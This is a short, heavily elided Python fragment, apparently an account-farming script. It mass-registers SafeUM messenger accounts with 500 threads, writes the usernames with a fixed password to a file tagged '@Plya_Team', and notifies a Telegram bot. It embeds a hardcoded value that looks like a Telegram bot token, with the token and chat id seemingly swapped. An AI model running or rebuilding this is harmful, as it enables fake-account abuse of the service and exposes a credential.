...
def work():
    ...
    try:
        ...
        if '"status":"Success"' in gzip:
            ...
            print(b)
            message = f'New account generated: {username}'
            send_message_to_bot(message)
            with open('SafeUM-Accounts.txt', 'a') as f:
                f.write(username + ":hhhh | TG : @Plya_Team\n")
...
def send_message_to_bot(message):
    bot_token = '7047603729'
    chat_id = '7156218318:AAGPK7OAxHj1Gz-QfR_uGCzoeV_BB7XfBgM'
...
start = ThreadPoolExecutor(max_workers=500)
